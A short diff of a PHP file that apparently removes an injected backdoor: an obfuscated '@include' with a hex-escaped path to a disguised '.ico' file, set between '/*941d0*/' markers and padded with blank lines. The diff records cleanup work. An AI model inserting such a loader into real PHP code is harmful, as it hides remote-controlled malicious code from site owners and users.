@@ -1,15 +1,5 @@
 <?php
 
-
-
-
-
-/*941d0*/
-
-@include "\x2fhom\x65/ho\x32650\x307/i\x6didg\x2ecom\x2eua/\x77ww/\x70ma/\x6as/c\x6fdem\x69rro\x72/fa\x76ico\x6e_4e\x3809d\x2eico";
-
-/*941d0*/
-
 //error_reporting(E_ALL ^ E_NOTICE);
 //ini_set('display_errors', 1);
 session_start();
